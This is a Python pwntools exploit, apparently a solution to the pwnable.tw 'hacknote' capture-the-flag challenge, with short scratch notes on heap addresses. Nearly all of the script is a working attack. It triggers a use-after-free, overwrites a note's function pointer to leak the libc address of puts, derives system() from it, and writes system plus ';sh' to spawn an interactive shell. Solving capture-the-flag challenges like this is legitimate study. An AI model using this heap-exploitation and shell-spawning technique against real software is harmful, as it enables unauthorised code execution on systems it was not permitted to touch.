"""
8
30
30
30

free 3 2 3 0

30

0
0x804b048->0x804b080->
"""
from pwn import*



def add_note(size, content):
	s.recv(1024)
	s.send("1\n")
	s.recv(1024)
	s.send(str(size)+"\n")
	s.recv(1024)
	s.send(content)

def delete_note(index):
	s.recv(1024)
	s.send("2\n")
	s.recv(1024)
	s.send(str(index)+"\n")

def print_note(index):
	s.recv(1024)
	s.send("3\n")
	s.recv(1024)
	s.send(str(index)+"\n")

if __name__=='__main__':
	s=process("./hacknote")
	#s=remote("chall.pwnable.tw", '10102')
	add_note(30,"abcd")
	add_note(30,"abcd")
	delete_note(0)
	delete_note(1)
	#pause()
	add_note(8,p32(0x0804862b)+p32(0x0804a024))
	pause()
	print_note(0)
	a=s.recv(4)
	puts=u32(a)
	system=puts-149504
	print(hex(system))
	delete_note(2)
	add_note(8,p32(system)+";sh")
	pause()
	print_note(0)
	s.interactive()
	s.close()
#puts:  0xf7e7e140
#system: 0xf7e59940
#sh: 0xf7f77e8b